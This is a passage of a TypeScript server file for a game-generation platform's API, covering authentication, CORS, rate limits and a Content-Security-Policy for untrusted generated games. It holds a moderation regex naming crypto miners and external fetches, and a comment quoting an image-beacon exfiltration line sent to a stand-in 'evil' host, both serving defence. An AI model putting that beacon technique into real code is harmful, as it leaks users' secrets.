import { createHash, randomBytes, randomUUID, timingSafeEqual } from 'node:crypto';
import { rm } from 'node:fs/promises';
/**
 * Control-plane API (Fastify). Phase 0 scope: health + authenticated projects
 * CRUD + generation enqueue + SSE event relay.
 *
 * buildServer() takes all dependencies so the entire surface is testable via
 * fastify.inject() without Postgres, Clerk, Redis, or a real worker.
 *
 * SSE relay (GET /v1/runs/:id/stream):
 *   The handler subscribes to `run:{id}` on the bus. InMemoryEventBus replays
 *   history synchronously before going live, which means inject() tests work
 *   without timing gymnastics — pre-publish events (including the terminal
 *   `run_complete`) to the bus, then inject the SSE route; replay fires
 *   synchronously, the handler ends the response, inject() returns the full body.
 */
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import websocketPlugin from '@fastify/websocket';
import type { EventBus } from '@playforge/bus';
import { runChannel } from '@playforge/bus';
import { type ExportGameHtmlOptions, buildGameHtml } from '@playforge/exporters';
import { exportGameZip } from '@playforge/exporters/game-zip';
import { type ModelRef, PROVIDER_SHORTLIST } from '@playforge/shared';
import { type SnapshotStore, contentTypeFor } from '@playforge/storage';
import {
  and as drizzleAnd,
  eq as drizzleEq,
  isNull as drizzleIsNull,
  or as drizzleOr,
  sql as drizzleSql,
} from 'drizzle-orm';
import Fastify, { type FastifyInstance, type FastifyReply, type FastifyRequest } from 'fastify';
import {
  type AccountProvider,
  type AccountRepo,
  type AccountSettings,
  type ByokProvider,
  isAccountProvider,
  isByokProvider,
} from './account-repo';
import { decryptApiKey, encryptApiKey, last4OfApiKey } from './api-key-crypto';
import type { AuthedUser, Authenticator } from './auth';
import { generateSessionToken, hashPassword, sessionExpiresAt, verifyPassword } from './auth';
import type { BrowserJobQueue, RuntimeVerifyResult, ThumbnailResult } from './browser-queue';
import type { ChatRepo } from './chat-repo';
import type { CreditPurchaseProvider } from './credit-purchase';
import { type EmailPort, buildPasswordResetEmail } from './email';
import type { HubRepo } from './hub-repo';
import type { PublishRepo } from './publish-repo';
import type { Engine, ProjectRepo, Visibility } from './repo';
import type { Run, RunRepo } from './run-repo';
import type { SnapshotRepo } from './snapshot-repo';

/**
 * autoMod — lightweight keyword/pattern classifier for published game content.
 * Returns a list of flag labels when the content matches; empty array means clean.
 * Matched content is logged and recorded as a moderation report, but stays 'live'
 * by default. Escalate to 'pending_review' setStatus when abuse rates warrant a gate.
 */
function autoMod(title: string, html: string): string[] {
  const flags: string[] = [];
  const combined = `${title} ${html}`.toLowerCase();

  // Phishing / social-engineering patterns
  if (
    /\b(enter your password|your account has been|verify your identity|click here to claim)\b/.test(
      combined,
    )
  ) {
    flags.push('phishing_language');
  }
  // Exfil attempt — tries to load external scripts or phone home despite CSP
  if (
    /\bfetch\s*\(\s*['"]https?:\/\/(?!cdn\.jsdelivr\.net|cdnjs\.cloudflare\.com|unpkg\.com|cdn\.skypack\.dev)/.test(
      html,
    )
  ) {
    flags.push('external_fetch');
  }
  // Crypto miners
  if (/\b(coinhive|cryptonight|monero|xmrig|wasm.*miner)\b/.test(combined)) {
    flags.push('crypto_miner');
  }
  // Iframe injection of 3rd-party origins
  if (/<iframe[^>]+src\s*=\s*['"]https?:\/\/(?!localhost)/.test(html)) {
    flags.push('external_iframe');
  }

  return flags;
}

const PREVIEW_AUTH_COOKIE = 'pf_preview_auth';
const PREVIEW_AUTH_COOKIE_MAX_AGE_SECONDS = 60 * 60;

/**
 * Content-Security-Policy for SERVED, UNTRUSTED game HTML. Published `/play`
 * bundles are self-contained single-file HTML, while live `/preview` snapshots
 * are multi-file and may load their generated `src/main.js` plus engine modules.
 * Generated game code is untrusted, so these headers are the real anti-exfil
 * boundary (plan §7), not a nicety.
 *
 *  - default-src 'none'                  — deny-by-default; only the lines below open.
 *  - script-src 'unsafe-inline' data: blob: — single-file bundles inline scripts;
 *                                          'unsafe-eval' is intentionally absent.
 *  - img-src / media-src 'self' data: blob: — NO wildcard. `img-src *` lets a
 *      hostile game exfiltrate via an image beacon
 *      (`new Image().src='https://evil/?'+secret`), silently defeating
 *      connect-src 'none'. These MUST stay locked to self/data/blob.
 *  - connect-src                         — published games use 'none'; preview uses
 *                                          'self' for same-origin dev assets only.
 */
function gameContentCsp(
  frameAncestors: string,
  mode: 'single-file' | 'preview-multifile' = 'single-file',
): string {
  if (mode === 'preview-multifile') {
    return [
      "default-src 'none'",
      "script-src 'self' 'unsafe-inline' data: blob: https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com https://cdn.skypack.dev",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: blob:",
      "media-src 'self' data: blob:",
      "font-src 'self' data:",
      "worker-src 'self' blob:",
      "connect-src 'self'",
      "base-uri 'none'",
      "form-action 'none'",
      `frame-ancestors ${frameAncestors}`,
    ].join('; ');
  }

  return [
    "default-src 'none'",
    "script-src 'unsafe-inline' data: blob:",
    "style-src 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "media-src 'self' data: blob:",
    'font-src data:',
    'worker-src blob:',
    "connect-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
    `frame-ancestors ${frameAncestors}`,
  ].join('; ');
}

function firstQueryValue(req: FastifyRequest, key: string): string | undefined {
  const query = req.query as Record<string, string | string[] | undefined>;
  const value = query[key];
  const first = Array.isArray(value) ? value[0] : value;
  return first && first.length > 0 ? first : undefined;
}

function readCookie(cookieHeader: string | string[] | undefined, name: string): string | undefined {
  const rawHeader = Array.isArray(cookieHeader) ? cookieHeader.join('; ') : cookieHeader;
  if (!rawHeader) return undefined;

  for (const part of rawHeader.split(';')) {
    const trimmed = part.trim();
    const separator = trimmed.indexOf('=');
    if (separator <= 0) continue;
    if (trimmed.slice(0, separator) !== name) continue;
    try {
      return decodeURIComponent(trimmed.slice(separator + 1));
    } catch {
      return undefined;
    }
  }

  return undefined;
}

function previewAuthCookieValue(req: FastifyRequest): string | null {
  const token = firstQueryValue(req, 'token');
  if (token) return `token:${token}`;

  const userId = firstQueryValue(req, 'userId');
  if (userId) return `user:${userId}`;

  return null;
}

function previewAuthCookieHeader(runId: string, value: string): string {
  return [
    `${PREVIEW_AUTH_COOKIE}=${encodeURIComponent(value)}`,
    `Path=/v1/runs/${encodeURIComponent(runId)}/preview/`,
    `Max-Age=${PREVIEW_AUTH_COOKIE_MAX_AGE_SECONDS}`,
    'HttpOnly',
    'SameSite=Lax',
  ].join('; ');
}

function applyPreviewCookieAuth(
  hdrs: Record<string, string | string[] | undefined>,
  cookieValue: string | undefined,
): void {
  if (!cookieValue) return;

  const separator = cookieValue.indexOf(':');
  if (separator <= 0) return;

  const kind = cookieValue.slice(0, separator);
  const value = cookieValue.slice(separator + 1);
  if (!value) return;

  if (kind === 'token' && !hdrs['authorization']) {
    hdrs['authorization'] = `Bearer ${value}`;
  }
  if (kind === 'user' && !hdrs['x-user-id']) {
    hdrs['x-user-id'] = value;
  }
}

/** Minimal payload the API passes to the generation queue. */
export type EnqueueFn = (input: {
  runId: string;
  projectId: string;
  userId: string;
  prompt: string;
  /** Per-run provider/model override. Undefined means platform defaults. */
  model?: ModelRef;
  /** Decrypted BYOK API key override. Undefined means platform key. */
  apiKey?: string;
  /** Manifest key of the project's current snapshot — seeds the new generation with existing files. */
  parentManifestKey?: string;
  /** Hard token ceiling for this run — worker aborts if exceeded. */
  maxTokens?: number;
  /** Continuation state from a previously paused run. */
  continuation?: unknown;
  /**
   * When true, the working tree is seeded from a remixed project. The worker
   * will prepend an untrusted-content safety header to the effective prompt.
   */
  isRemix?: boolean;
}) => Promise<void>;

export interface ServerDeps {
  repo: ProjectRepo;
  auth: Authenticator;
  bus: EventBus;
  runRepo: RunRepo;
  enqueue: EnqueueFn;
  /** Optional: enables GET /v1/runs/:id/preview/* to serve generated game files. */
  store?: SnapshotStore;
  /** Optional: persists chat history (user prompts + artifact notifications). */
  chatRepo?: ChatRepo;
  /** Optional: enables publish + play routes. */
  publishRepo?: PublishRepo;
  /** Optional: enables community hub routes. */
  hubRepo?: HubRepo;
  /** Optional: max concurrent runs per user (default 1 free / 3 pro — enforced if set). */
  maxConcurrentRunsPerUser?: number;
  /** Optional: admin token for moderation endpoints. */
  adminToken?: string;
  /** Optional: async function to embed text for pgvector Hub search. */
  embedText?: (text: string) => Promise<number[]>;
  /** Optional: browser-worker queue for thumbnail capture + runtime verification. */
  browserQueue?: BrowserJobQueue;
  /**
   * Optional: space-separated list of origins allowed to embed published games in iframes.
   * Defaults to '*' when not set. Set to your app origin(s) in production.
   * Example: "https://playforge.app https://staging.playforge.app"
   */
  allowedFrameOrigins?: string;
  /**
   * Optional: space-separated list of browser app origins allowed to call the API.
   * When unset, localhost/127.0.0.1 dev origins are allowed.
   */
  allowedCorsOrigins?: string;
  /** Optional: BullMQ Queue instance used to report queue depth for autoscaling. */
  generateQueue?: import('bullmq').Queue;
  /** Optional: max tokens per run — hard ceiling to prevent runaway generation costs. */
  maxRunTokens?: number;
  /** Optional: enables GET /v1/projects/:id/snapshots + revert endpoint. */
  snapshotRepo?: SnapshotRepo;
  /** Optional: enables /v1/auth/* routes (register, login, logout, me). */
  authDb?: import('@playforge/db').Db;
  /** Optional: enables /v1/account/* routes and per-user provider resolution. */
  accountRepo?: AccountRepo;
  /** Optional: platform default model used when a user has not selected BYOK. */
  platformModel?: ModelRef;
  /** Optional: server-side envelope secret for encrypted BYOK keys. */
  apiKeyEncryptionSecret?: string;
  /**
   * Optional: public app base URL (e.g. "https://playforge.app") used to build
   * the exported game's "Made with Playforge — Remix this" CTA deep link (#3.2).
   * Configurable, never hardcoded. When unset, no CTA is injected into bundles.
   */
  appBaseUrl?: string;
  /** Optional: SSE keep-alive cadence (ms). Defaults to SSE_HEARTBEAT_MS. */
  sseHeartbeatMs?: number;
  /** Optional: hard cap on a single SSE stream (ms). Defaults to SSE_MAX_STREAM_MS. */
  sseMaxStreamMs?: number;
  /**
   * Optional (Phase 6.1): credit-purchase provider. When set, enables
   * POST /v1/credits/purchase. Flag/env-gated — mock by default in dev, a real
   * provider swaps in later behind the same port. Requires authDb to grant.
   */
  creditProvider?: CreditPurchaseProvider;
  /**
   * Optional (Phase 6.2): email transport for password-reset mail. When set
   * (with authDb), enables /v1/auth/forgot-password + /v1/auth/reset-password.
   * Console transport is the dev default; a real provider swaps in later.
   */
  email?: EmailPort;
}

const ENGINES: Engine[] = ['three', 'phaser'];
const VISIBILITIES: Visibility[] = ['private', 'unlisted', 'public'];
const ACCOUNT_PROVIDERS: AccountProvider[] = ['platform', 'anthropic', 'openai'];
const DEFAULT_PLATFORM_MODEL: ModelRef = { provider: 'openai', modelId: 'o4-mini' };
const DEFAULT_BYOK_MODELS: Record<ByokProvider, string> = {
  anthropic: PROVIDER_SHORTLIST.anthropic.defaultPrimary,
  openai: PROVIDER_SHORTLIST.openai.defaultPrimary,
};

/** Per-project WebSocket presence: projectId → Set of connected socket send functions. */
const presenceSockets = new Map<string, Set<(msg: string) => void>>();

/** Per-project CRDT collab rooms: projectId → Set of raw WebSocket objects for binary relay. */
// biome-ignore lint/suspicious/noExplicitAny: raw ws WebSocket objects relayed as opaque binary; no shared type at this boundary.
const collabRooms = new Map<string, Set<any>>();

type ProjectWebSocket = {
  close(code?: number, reason?: string): void;
  send(data: string | Buffer): void;
  on(event: 'message', listener: (data: Buffer | ArrayBuffer) => void): void;
  on(event: 'close', listener: () => void): void;
  readyState?: number;
};

const FREE_TIER_CREDITS = 100;
const CREDITS_PER_RUN = 10;

/** Password-reset token lifetime (Phase 6.2). Short by design — long enough to
 *  click through from an email, short enough to bound a leaked-token window. */
const PASSWORD_RESET_TTL_MS = 30 * 60 * 1000; // 30 minutes
/** Mirror the register route's password caps for the reset path. */
const PASSWORD_MIN_LEN = 8;
const PASSWORD_MAX_LEN = 200;

/** SHA-256 hex of a raw reset token. Only the hash is persisted; the raw token
 *  is mailed to the user. A presented token is re-hashed and matched here. */
function hashResetToken(raw: string): string {
  return createHash('sha256').update(raw).digest('hex');
}

/**
 * Sentinel thrown by the reservation transaction when the user's balance can't
 * cover one run. The generate route catches it, marks the just-created run
 * failed, and replies 402. A dedicated class (vs. a plain Error) lets the route
 * distinguish "insufficient credits" from a genuine DB/transaction failure.
 */
export class InsufficientCreditsError extends Error {
  constructor(
    readonly balance: number,
    readonly required: number,
  ) {
    super('insufficient_credits');
    this.name = 'InsufficientCreditsError';
  }
}

/**
 * Sentinel for the reset-password transaction: thrown when the token-burn UPDATE
 * (guarded on `used_at IS NULL`) affects zero rows, i.e. a concurrent submit
 * already consumed the token. The route maps it to the same 400 as an
 * invalid/expired token so a racing double-submit can never reset twice.
 */
class ResetTokenRaceError extends Error {
  constructor() {
    super('reset_token_already_used');
    this.name = 'ResetTokenRaceError';
  }
}

/**
 * Pure affordability decision — extracted so it can be unit-tested without a
 * live Postgres. Returns whether `balance` covers one run plus the 402 body the
 * route sends when it doesn't. The reservation transaction and this helper must
 * agree on the threshold (`balance < required`).
 */
export function decideAffordability(
  balance: number,
  required: number = CREDITS_PER_RUN,
): { ok: boolean; balance: number; required: number } {
  return { ok: balance >= required, balance, required };
}

/** SSE keep-alive comment frame. Ignored by EventSource (it's a comment, not a
 *  `data:` line) but keeps idle proxies from dropping a long, quiet build. */
export const SSE_HEARTBEAT_FRAME = ': ping\n\n';
/** Default heartbeat cadence — under the ~30–60s idle-drop window of common
 *  proxies/CDNs. */
export const SSE_HEARTBEAT_MS = 20_000;
/** Hard cap on a single SSE stream. Well above a legit long run (so real builds
 *  are never cut), but bounds a wedged worker / forgotten tab from leaking a
 *  connection + its bus subscription forever. */
export const SSE_MAX_STREAM_MS = 25 * 60 * 1000;

/**
 * Wire the SSE keep-alive heartbeat + hard max-duration cap for one stream.
 *
 * Extracted so the timer behaviour is unit-testable in isolation (with fake
 * timers): a `: ping` frame is written every `heartbeatMs`, the `onCap` fires
 * once after `maxMs`, and the returned `stop()` clears BOTH timers so neither
 * leaks after the stream closes/finishes. Both timers are `unref()`-ed so they
 * never keep the process (or an inject() test) alive on their own.
 */
export function attachSseHeartbeat(
  write: (chunk: string) => void,
  onCap: () => void,
  opts?: { heartbeatMs?: number; maxMs?: number },
): () => void {
  const heartbeatMs = opts?.heartbeatMs ?? SSE_HEARTBEAT_MS;
  const maxMs = opts?.maxMs ?? SSE_MAX_STREAM_MS;
  const heartbeat = setInterval(() => write(SSE_HEARTBEAT_FRAME), heartbeatMs);
  heartbeat.unref?.();
  const cap = setTimeout(onCap, maxMs);
  cap.unref?.();
  return () => {
    clearInterval(heartbeat);
    clearTimeout(cap);
  };
}

function parseOriginAllowlist(raw: string | undefined): Set<string> {
  return new Set(
    (raw ?? '')
      .split(/\s+/)
      .map((origin) => origin.trim())
      .filter((origin) => origin.length > 0),
  );
}

function isLocalDevOrigin(origin: string): boolean {
  try {
    const url = new URL(origin);
    return (
      (url.protocol === 'http:' || url.protocol === 'https:') &&
      (url.hostname === 'localhost' || url.hostname === '127.0.0.1' || url.hostname === '::1')
    );
  } catch {
    return false;
  }
}

function isCorsOriginAllowed(
  origin: string,
  allowlist: Set<string>,
  hasExplicitAllowlist: boolean,
): boolean {
  if (allowlist.has(origin)) return true;
  if (!hasExplicitAllowlist && isLocalDevOrigin(origin)) return true;
  return false;
}

export function buildServer(deps: ServerDeps): FastifyInstance {
  // bodyLimit caps total request size (#31) — a 1 MiB ceiling is ample for prompts,
  // chat, and auth payloads while refusing memory-exhaustion bodies (413).
  // trustProxy: behind Cloudflare/edge, req.ip must reflect the client (via
  // X-Forwarded-For), not the proxy socket — otherwise every per-IP control
  // (auth throttle, play-count dedup) sees one shared proxy IP and either
  // throttles all users together or can't distinguish them. (auth H2)
  const app = Fastify({ logger: false, bodyLimit: 1_048_576, trustProxy: true });
  const corsAllowlist = parseOriginAllowlist(deps.allowedCorsOrigins);
  const hasExplicitCorsAllowlist =
    deps.allowedCorsOrigins !== undefined && deps.allowedCorsOrigins.trim().length > 0;

  const applyCorsHeaders = (
    req: FastifyRequest,
    setHeader: (name: string, value: string) => void,
  ): boolean => {
    const rawOrigin = req.headers.origin;
    const origin = Array.isArray(rawOrigin) ? rawOrigin[0] : rawOrigin;
    if (!origin || !isCorsOriginAllowed(origin, corsAllowlist, hasExplicitCorsAllowlist)) {
      return false;
    }
    setHeader('Access-Control-Allow-Origin', origin);
    setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE,OPTIONS');
    setHeader('Access-Control-Allow-Headers', 'Authorization,Content-Type,X-Admin-Token,X-User-Id');
    setHeader('Access-Control-Max-Age', '600');
    setHeader('Vary', 'Origin');
    return true;
  };

  app.addHook('onRequest', async (req, reply) => {
    if (applyCorsHeaders(req, (name, value) => reply.header(name, value))) {
      if (req.method === 'OPTIONS') {
        return reply.code(204).send();
      }
    }
  });

  // Project name = published title, rendered into <head>/OG tags + every feed
  // card. Cap it to bound stored content and OG payloads. (content MEDIUM)
  const MAX_PROJECT_NAME_LEN = 120;
  // Hub comment body cap — uncapped, the only limit was the 1 MiB bodyLimit. (content MEDIUM)
  const MAX_COMMENT_LEN = 2000;
  void app.register(websocketPlugin);

  // ── Auth rate limiting (in-memory, per-server-instance) ──────────────────
  const authAttempts = new Map<string, { count: number; resetAt: number }>();
  const AUTH_WINDOW_MS = 15 * 60 * 1000;
  const AUTH_MAX_ATTEMPTS = 10;

  function checkAuthRateLimit(key: string): boolean {
    const now = Date.now();
    const entry = authAttempts.get(key);
    if (!entry || entry.resetAt < now) {
      authAttempts.set(key, { count: 1, resetAt: now + AUTH_WINDOW_MS });
      return true;
    }
    if (entry.count >= AUTH_MAX_ATTEMPTS) return false;
    entry.count++;
    return true;
  }

  function clearAuthRateLimit(key: string): void {
    authAttempts.delete(key);
  }

  // Handles that must not be registrable — they back routes (/u/:handle vs
  // /hub, /api, …), imply staff/system identity (admin, support, moderator), or
  // are the brand itself. Registering them enables impersonation/phishing. (content HIGH)
  const RESERVED_HANDLES = new Set([
    'admin',
    'administrator',
    'root',
    'sysadmin',
    'system',
    'staff',
    'moderator',
    'mod',
    'support',
    'help',
    'helpdesk',
    'official',
    'team',
    'security',
    'abuse',
    'billing',
    'api',
    'app',
    'auth',
    'login',
    'logout',
    'register',
    'signup',
    'signin',
    'me',
    'settings',
    'account',
    'profile',
    'user',
    'users',
    'u',
    'p',
    'hub',
    'home',
    'about',
    'contact',
    'legal',
    'terms',
    'privacy',
    'playforge',
    'null',
    'undefined',
    'anonymous',
    'guest',
    'everyone',
  ]);

  /**
   * A handle is reserved if it matches the denylist directly OR collapses to a
   * reserved name once separators are removed — so `ad_min`, `a-d-m-i-n`, and
   * `admin` are all rejected, closing separator-homoglyph impersonation. (content HIGH)
   */
  function isReservedHandle(handle: string): boolean {
    if (RESERVED_HANDLES.has(handle)) return true;
    const collapsed = handle.replace(/[_-]/g, '');
    return RESERVED_HANDLES.has(collapsed);
  }

  // Play-count dedup (#35a, in-memory per-instance): a given client (slug+ip)
  // can only bump a game's play count once per window, so the metric isn't
  // trivially inflated by reload spam. Multi-instance Redis dedup is a follow-up.
  const playCountSeen = new Map<string, number>();
  const PLAY_DEDUP_WINDOW_MS = 60 * 1000;
  function shouldCountPlay(key: string): boolean {
    const now = Date.now();
    const last = playCountSeen.get(key);
    if (last !== undefined && now - last < PLAY_DEDUP_WINDOW_MS) return false;
    playCountSeen.set(key, now);
    return true;
  }

  // Leaderboard submit rate-cap (Phase 3.8, in-memory per-instance): one
  // session (salted-IP `slug:ip` hash, same shape as the play-count throttle)
  // can only submit one score per window, so a single client can't spam the
  // board. Separate map from playCountSeen so a play and a score don't share
  // the throttle. Multi-instance Redis dedup is a follow-up like #35a.
  const scoreSubmitSeen = new Map<string, number>();
  const SCORE_SUBMIT_WINDOW_MS = 60 * 1000;
  function shouldAcceptScore(key: string): boolean {
    const now = Date.now();
    const last = scoreSubmitSeen.get(key);
    if (last !== undefined && now - last < SCORE_SUBMIT_WINDOW_MS) return false;
    scoreSubmitSeen.set(key, now);
    return true;
  }

  async function getUserBalance(userId: string): Promise<number> {
    if (!deps.authDb) return Number.POSITIVE_INFINITY;
    const { schema: s } = await import('@playforge/db');
    const [row] = await deps.authDb
      .select({ bal: drizzleSql<number>`COALESCE(SUM(${s.creditLedger.delta}), 0)` })
      .from(s.creditLedger)
      .where(drizzleEq(s.creditLedger.userId, userId));
    return Number(row?.bal ?? 0);
  }

  /**
   * Extract + authenticate a request's identity. EventSource (SSE) and
   * WebSocket cannot set custom headers, so a `?token=` (Bearer) or `?userId=`
   * (dev HeaderAuth) query param is accepted ONLY on routes that opt in via
   * `allowQueryToken` — the SSE stream, the run preview, and the presence/collab
   * WebSockets. Honoring it on every route would leak the session token into
   * URLs and access logs platform-wide (#21a).
   *
   * `allowPreviewCookie` is only for preview subresources. The iframe's first
   * HTML request can carry ?token=, but generated relative URLs cannot inherit
   * that query string, so the preview route sets a path-scoped HttpOnly cookie.
   * Returns the user or null.
   */
  async function authenticateRequest(
    req: FastifyRequest,
    opts?: { allowQueryToken?: boolean; allowPreviewCookie?: boolean },
  ): Promise<AuthedUser | null> {
    const hdrs: Record<string, string | string[] | undefined> = { ...req.headers };
    if (opts?.allowQueryToken) {
      const qToken = firstQueryValue(req, 'token');
      if (qToken && !hdrs['authorization']) hdrs['authorization'] = `Bearer ${qToken}`;
      const qUserId = firstQueryValue(req, 'userId');
      if (qUserId && !hdrs['x-user-id']) hdrs['x-user-id'] = qUserId;
    }
    if (opts?.allowPreviewCookie) {
      applyPreviewCookieAuth(hdrs, readCookie(req.headers.cookie, PREVIEW_AUTH_COOKIE));
    }
    return deps.auth.authenticate(hdrs);
  }

  async function requireUser(
    req: FastifyRequest,
    reply: FastifyReply,
    opts?: { allowQueryToken?: boolean; allowPreviewCookie?: boolean },
  ): Promise<AuthedUser | null> {
    const user = await authenticateRequest(req, opts);
    if (!user) {
      await reply.code(401).send({ error: 'unauthenticated' });
      return null;
    }
    return user;
  }

  /**
   * Authenticate a WebSocket upgrade and verify the connecting user owns the
   * project. There is no project-sharing model yet, so access is owner-only —
   * the correct closed posture until a collaborators table exists. Closes the
   * socket (1008 policy violation) and returns null on any failure.
   */
  async function authorizeProjectSocket(
    socket: Pick<ProjectWebSocket, 'close'>,
    req: FastifyRequest,
    projectId: string,
  ): Promise<AuthedUser | null> {
    // WebSockets can't set headers — the ?token= query fallback is required here.
    const user = await authenticateRequest(req, { allowQueryToken: true });
    if (!user) {
      socket.close(1008, 'unauthenticated');
      return null;
    }
    const project = await deps.repo.get(projectId);
    if (!project || project.ownerId !== user.userId) {
      socket.close(1008, 'forbidden');
      return null;
    }
    return user;
  }

  function isProjectWebSocket(value: unknown): value is ProjectWebSocket {
    return (
      value !== null &&
      typeof value === 'object' &&
      typeof (value as { close?: unknown }).close === 'function' &&
      typeof (value as { send?: unknown }).send === 'function' &&
      typeof (value as { on?: unknown }).on === 'function'
    );
  }

  function isFastifyRequest(value: unknown): value is FastifyRequest {
    return (
      value !== null &&
      typeof value === 'object' &&
      typeof (value as { url?: unknown }).url === 'string' &&
      'headers' in value
    );
  }

  function websocketArgs(
    first: unknown,
    second: unknown,
  ): { socket: ProjectWebSocket; req: FastifyRequest } | null {
    if (isProjectWebSocket(first) && isFastifyRequest(second)) {
      return { socket: first, req: second };
    }
    if (isProjectWebSocket(second) && isFastifyRequest(first)) {
      return { socket: second, req: first };
    }
    return null;
  }

  function projectIdFromSocketRequest(
    req: FastifyRequest,
    channel: 'presence' | 'collab',
  ): string | null {
    const idFromParams = (req.params as { id?: unknown } | undefined)?.id;
    if (typeof idFromParams === 'string' && idFromParams.length > 0) return idFromParams;

    try {
      const pathname = new URL(req.url, 'http://localhost').pathname;
      const match = pathname.match(new RegExp(`^/v1/projects/([^/]+)/${channel}$`));
      return match?.[1] ? decodeURIComponent(match[1]) : null;
    } catch {
      return null;
    }
  }

  /** Constant-time string compare (utf8). Length mismatch short-circuits — an
   *  acceptable minor leak for a secret token vs. the timing oracle of `!==`. */
  function constantTimeEqual(a: string, b: string): boolean {
    const ab = Buffer.from(a, 'utf8');
    const bb = Buffer.from(b, 'utf8');
    if (ab.length !== bb.length) return false;
    return timingSafeEqual(ab, bb);
  }

  /**
   * Gate for admin/moderation routes. FAILS CLOSED: when no ADMIN_TOKEN is
   * configured the surface is *disabled* (503), never open — an unset token must
   * never silently mean "everyone is an admin" (the previous `if (deps.adminToken)`
   * skipped the check entirely when unset). Returns true only on a constant-time
   * token match; otherwise it has already sent the response.
   */
  function requireAdmin(req: FastifyRequest, reply: FastifyReply): boolean {
    if (!deps.adminToken) {
      void reply.code(503).send({ error: 'admin_disabled' });
      return false;
    }
    const provided = req.headers['x-admin-token'];
    const token = Array.isArray(provided) ? provided[0] : provided;
    if (!token || !constantTimeEqual(token, deps.adminToken)) {
      void reply.code(403).send({ error: 'forbidden' });
      return false;
    }
    return true;
  }

  function defaultModelForProvider(provider: AccountProvider): string {
    if (provider === 'platform') {
      return (deps.platformModel ?? DEFAULT_PLATFORM_MODEL).modelId;
    }
    return DEFAULT_BYOK_MODELS[provider];
  }

  function accountSettingsResponse(settings: AccountSettings) {
    const keyByProvider = new Map(settings.keys.map((key) => [key.provider, key]));
    const defaultModelId =
      settings.defaultModelId?.trim() || defaultModelForProvider(settings.defaultProvider);
    return {
      user: {
        id: settings.userId,
        email: settings.email,
        handle: settings.handle,
        displayName: settings.displayName,
        avatarUrl: settings.avatarUrl,
        bio: settings.bio,
      },
      defaultProvider: settings.defaultProvider,
      defaultModelId,
      onboardingComplete: settings.onboardingCompletedAt !== null,
      providers: ACCOUNT_PROVIDERS.map((provider) => {
        if (provider === 'platform') {
          const platformModel = deps.platformModel ?? DEFAULT_PLATFORM_MODEL;
          return {
            provider,
            label: 'Playforge credits',
            configured: true,
            last4: null,
            defaultModelId: platformModel.modelId,
            active: settings.defaultProvider === provider,
          };
        }
        const key = keyByProvider.get(provider);
        return {
          provider,
          label: PROVIDER_SHORTLIST[provider].label,
          configured: key !== undefined,
          last4: key?.last4 ?? null,
          defaultModelId:
            settings.defaultProvider === provider
              ? defaultModelId
              : defaultModelForProvider(provider),
          active: settings.defaultProvider === provider,
          keyHelpUrl: PROVIDER_SHORTLIST[provider].keyHelpUrl,
        };
      }),
    };
  }

  function apiKeyShapeError(provider: ByokProvider, apiKey: string): string | null {
    const trimmed = apiKey.trim();
    if (provider === 'anthropic' && !trimmed.startsWith('sk-ant-')) {
      return 'invalid_anthropic_key';
    }
    if (provider === 'openai' && !trimmed.startsWith('sk-')) {
      return 'invalid_openai_key';
    }
    return null;
  }

  async function resolveGenerationCredentials(
    userId: string,
  ): Promise<
    | { ok: true; model?: ModelRef; apiKey?: string }
    | { ok: false; status: number; body: Record<string, unknown> }
  > {
    if (!deps.accountRepo) {
      return { ok: true };
    }
    const settings = await deps.accountRepo.getSettings(userId);
    if (!settings || settings.defaultProvider === 'platform') {
      return { ok: true, model: deps.platformModel ?? DEFAULT_PLATFORM_MODEL };
    }

    const provider = settings.defaultProvider;
    const savedKey = settings.keys.find((key) => key.provider === provider);
    if (!savedKey) {
      return {
        ok: false,
        status: 409,
        body: { error: 'provider_key_required', provider },
      };
    }
    if (!deps.apiKeyEncryptionSecret) {
      return {
        ok: false,
        status: 503,
        body: { error: 'api_key_encryption_unavailable' },
      };
    }

    try {
      return {
        ok: true,
        model: {
          provider,
          modelId: settings.defaultModelId?.trim() || defaultModelForProvider(provider),
        },
        apiKey: decryptApiKey(savedKey.ciphertext, deps.apiKeyEncryptionSecret),
      };
    } catch (err) {
      console.error(
        `[account] failed to decrypt BYOK key for user=${userId} provider=${provider}`,
        err,
      );
      return {
        ok: false,
        status: 500,
        body: { error: 'api_key_decrypt_failed' },
      };
    }
  }

  // ── health ────────────────────────────────────────────────────────────────

  app.get('/health', async () => ({ ok: true, service: 'playforge-api' }));

  // ── auth ──────────────────────────────────────────────────────────────────
  // POST /v1/auth/register  — create account, return session token
  // POST /v1/auth/login     — validate credentials, return session token
  // POST /v1/auth/logout    — delete current session
  // GET  /v1/auth/me        — return current user (requires auth)

  app.post('/v1/auth/register', async (req, reply) => {
    if (!deps.authDb) return reply.code(503).send({ error: 'auth_unavailable' });
    const { schema: s } = await import('@playforge/db');
    const body = (req.body ?? {}) as {
      email?: unknown;
      password?: unknown;
      handle?: unknown;
      displayName?: unknown;
    };
    const email = typeof body.email === 'string' ? body.email.trim().toLowerCase() : null;
    const password = typeof body.password === 'string' ? body.password : null;
    // NFKC-fold BEFORE stripping so confusables collapse consistently (e.g.
    // fullwidth/compatibility chars) rather than being silently dropped to a
    // different ASCII handle. (content HIGH)
    const handle =
      typeof body.handle === 'string'
        ? body.handle
            .normalize('NFKC')
            .trim()
            .toLowerCase()
            .replace(/[^a-z0-9_-]/g, '')
        : null;
    const displayName = typeof body.displayName === 'string' ? body.displayName.trim() : handle;

    if (!email || !email.includes('@')) return reply.code(400).send({ error: 'invalid_email' });
    if (!password || password.length < 8)
      return reply.code(400).send({ error: 'password_too_short', min: 8 });
    if (!handle || handle.length < 2) return reply.code(400).send({ error: 'invalid_handle' });
    // Disallow leading/trailing separators and reserved/impersonation handles.
    if (/^[_-]|[_-]$/.test(handle)) return reply.code(400).send({ error: 'invalid_handle' });
    if (isReservedHandle(handle)) return reply.code(409).send({ error: 'handle_reserved' });
    // Ingress length caps (#31) — bound unbounded fields (scrypt input is a CPU/DoS
    // sink, and oversized rows are pointless). The bodyLimit guards total size; these
    // guard individual fields.
    if (email.length > 320) return reply.code(400).send({ error: 'email_too_long', max: 320 });
    if (password.length > 200)
      return reply.code(400).send({ error: 'password_too_long', max: 200 });
    if (handle.length > 32) return reply.code(400).send({ error: 'handle_too_long', max: 32 });
    if (displayName && displayName.length > 80)
      return reply.code(400).send({ error: 'display_name_too_long', max: 80 });

